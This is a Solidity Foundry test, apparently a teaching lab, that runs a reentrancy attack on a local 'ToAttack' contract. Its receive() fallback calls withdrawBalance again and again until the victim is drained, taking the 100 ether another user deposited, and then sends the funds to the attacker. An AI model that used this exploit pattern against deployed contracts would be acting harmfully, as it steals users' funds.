// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {ToAttack} from "../src/ToAttack.sol";

contract AttackerTest is Test {
    ToAttack public victim;
    address payable owner;

    function setUp() public {
        victim = new ToAttack();
        owner = payable(msg.sender);
        console.log("Attacker balance on startup: %d ether", owner.balance / 1 ether);
        console.log("Attacker smart contract balance on startup: %d ether", address(this).balance / 1 ether);
    }

    function testAttack() external payable {
        console.log("Attacker balance on victim smart contract before deposit: %d ether", victim.getUserBalance());
        console.log("Victim balance on victim smart contract before deposit: %d ether", address(victim).balance / 1 ether);
        victim.depositETH{value: 10 ether}();
        require(victim.getUserBalance() == 10, "Deposit is unsuccessful");
        console.log("Attacker balance after deposit on victim smart contract: %d ether", victim.getUserBalance());
        
        vm.prank(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC);
        vm.deal(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC, 123 ether);
        victim.depositETH{value: 100 ether}();
        require(address(victim).balance / 1 ether == 110, "Deposit from another user is unsuccessful");

        console.log("Victim balance on victim smart contract after second deposit and before attack: %d ether", address(victim).balance / 1 ether);

        victim.withdrawBalance();
    }

    receive() external payable {
        if(address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        } else {
            console.log("Attacker balance before transfer: %d", address(owner).balance / 1 ether);
            payable(owner).transfer(address(this).balance);
            console.log("Attacker balance after transfer: %d", (address(owner).balance / 1 ether) / 2);
        }
    }
}

